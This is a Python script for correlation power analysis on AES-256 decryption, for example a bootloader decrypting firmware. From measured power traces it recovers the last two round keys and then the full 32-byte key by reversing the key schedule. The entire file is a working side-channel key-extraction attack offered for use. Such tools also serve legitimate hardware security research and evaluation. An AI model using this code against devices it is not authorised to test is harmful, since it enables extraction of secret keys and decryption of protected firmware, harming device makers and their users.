"""
cpa_aes256.py — CPA on AES-256 decryption (rounds 14, 13, full key schedule).

Given ciphertext traces from an AES-256 decryption (e.g. a bootloader
that decrypts the incoming firmware image), recover the full 32-byte key.

Usage:
    python cpa_aes256.py traces.csv

CSV format: same as AES-128 script, but the "plaintext" column must
contain the ciphertext bytes (i.e. the data that was fed to the
decryption function). We use the ciphertext as our known input.

Output: 32-byte AES-256 key.
"""
import argparse, sys, time
from pathlib import Path
import numpy as np
import torch
from common import (DEVICE, INV_SBOX, HW_TABLE, pearson_corr, load_csv,
                    INV_SHIFT_ROWS, inv_mix_columns, inv_shift_rows,
                    shift_rows, mix_columns, aes256_inverse_key_schedule)

INV_SBOX_T = torch.tensor(list(INV_SBOX), dtype=torch.long, device=DEVICE)
KEYS_256 = torch.arange(256, device=DEVICE)


# =============================================================
# Round-14 CPA (first decryption round): recover K14
# =============================================================
def cpa_round14(traces, ciphertexts, verbose=True):
    """
    X14[b] = InvSBox[ct[b] ^ K14[b]]   (InvShiftRows is a permutation,
    irrelevant to per-byte CPA on HW.)

    Returns: K14 (16 bytes), peaks (16,)
    """
    traces = traces.to(DEVICE)
    keys_out = np.zeros(16, dtype=np.uint8)
    peaks = np.zeros(16, dtype=np.float32)

    for b in range(16):
        ct_b = torch.from_numpy(ciphertexts[:, b]).long().to(DEVICE)

        # Hypothetical: HW(InvSBox[ct ^ k]) for each of 256 guesses
        inter = INV_SBOX_T[ct_b.unsqueeze(0) ^ KEYS_256.unsqueeze(1)]
        L = HW_TABLE[inter]
        corr = pearson_corr(traces, L)
        pk = corr.abs().max(dim=1).values

        best = int(pk.argmax())
        keys_out[b] = best
        peaks[b] = float(pk[best])

        if verbose:
            top5 = pk.topk(5)
            margin = float(top5.values[0] - top5.values[1])
            print(f"  R14 byte {b:2d}: K=0x{best:02x}  |r|={peaks[b]:.4f}  "
                  f"margin={margin:+.4f}")

    return bytes(keys_out), peaks


# =============================================================
# Round-13 CPA (transformed key): recover K'13, then K13
# =============================================================
def cpa_round13(traces, ciphertexts, k14, verbose=True):
    """
    X14 = InvSubBytes(InvShiftRows(ct ^ K14))
    Y   = InvShiftRows(InvMixColumns(X14))
    X13 = InvSubBytes(Y ^ K'13)

    CPA on InvSBox[Y[b] ^ K'13[b]] → K'13
    Then K13 = MixColumns(ShiftRows(K'13))
    """
    traces = traces.to(DEVICE)
    D = ciphertexts.shape[0]

    # ---- 1. Compute X14 for all traces ----
    ct  = ciphertexts.astype(np.uint8)
    k14_arr = np.frombuffer(k14, dtype=np.uint8)
    step1 = ct ^ k14_arr[None, :]                    # (D, 16)
    step2 = inv_shift_rows(step1)                     # (D, 16)
    X14   = inv_sub_bytes_np(step2)                   # (D, 16)

    # ---- 2. Y = InvShiftRows(InvMixColumns(X14)) ----
    Y = inv_shift_rows(inv_mix_columns(X14))          # (D, 16)

    # ---- 3. Per-byte CPA on InvSBox[Y[b] ^ K'13[b]] ----
    keys_out = np.zeros(16, dtype=np.uint8)
    peaks = np.zeros(16, dtype=np.float32)

    for b in range(16):
        y_b = torch.from_numpy(Y[:, b]).long().to(DEVICE)
        inter = INV_SBOX_T[y_b.unsqueeze(0) ^ KEYS_256.unsqueeze(1)]
        L = HW_TABLE[inter]
        corr = pearson_corr(traces, L)
        pk = corr.abs().max(dim=1).values
        best = int(pk.argmax())
        keys_out[b] = best
        peaks[b] = float(pk[best])
        if verbose:
            top5 = pk.topk(5)
            margin = float(top5.values[0] - top5.values[1])
            print(f"  R13 byte {b:2d}: K'=0x{best:02x}  |r|={peaks[b]:.4f}  "
                  f"margin={margin:+.4f}")

    # ---- 4. Un-transform: K13 = MixColumns(ShiftRows(K'13)) ----
    k13 = mix_columns(shift_rows(keys_out[None, :]))[0]
    return bytes(k13), peaks


def inv_sub_bytes_np(state):
    return np.frombuffer(INV_SBOX, dtype=np.uint8)[state]


# =============================================================
# Main
# =============================================================
def main():
    ap = argparse.ArgumentParser(description="CPA on AES-256 decryption")
    ap.add_argument('csv', nargs='?')
    ap.add_argument('--demo', action='store_true',
                    help="(Not implemented for AES-256 in demo mode)")
    ap.add_argument('--n-pt-bytes', type=int, default=None,
                    help="Number of ciphertext byte columns (auto-detect by default)")
    ap.add_argument('--no-cache', action='store_true')
    ap.add_argument('--max-rows', type=int, default=None)
    ap.add_argument('--out', default='key_aes256_recovered.bin')
    ap.add_argument('--skip-round13', action='store_true')
    args = ap.parse_args()

    if not args.csv:
        sys.exit("Provide a CSV file with ciphertext traces.")

    traces, meta = load_csv(args.csv, n_pt_bytes=args.n_pt_bytes,
                            max_rows=args.max_rows, cache=not args.no_cache)

    # For decryption the "input" is the ciphertext
    if 'ciphertext' in meta:
        ct = meta['ciphertext']
    elif 'plaintext' in meta:
        ct = meta['plaintext']
        print("[!] Using 'plaintext' column as ciphertext input (decryption attack)")
    else:
        sys.exit("No ciphertext/plaintext column in CSV.")

    print(f"[*] Device: {DEVICE}   traces: {tuple(traces.shape)}")

    # ---- Round 14 ----
    print("\n[*] Round 14 CPA ...")
    t0 = time.time()
    k14, peaks14 = cpa_round14(traces, ct)
    print(f"[+] K14 = {k14.hex()}   ({time.time()-t0:.2f}s)")

    if args.skip_round13:
        print(f"[+] Saved K14 partial key to {args.out}")
        Path(args.out).write_bytes(k14)
        return

    # ---- Round 13 ----
    print("\n[*] Round 13 CPA (transformed key) ...")
    t0 = time.time()
    k13, peaks13 = cpa_round13(traces, ct, k14)
    print(f"[+] K13 = {k13.hex()}   ({time.time()-t0:.2f}s)")

    # ---- Full key ----
    print("\n[*] Reversing AES-256 key schedule ...")
    full_key = aes256_inverse_key_schedule(k14, k13)
    print(f"[+] Full AES-256 key: {full_key.hex()}")

    Path(args.out).write_bytes(full_key)
    print(f"[+] Saved to {args.out}")


if __name__ == '__main__':
    main()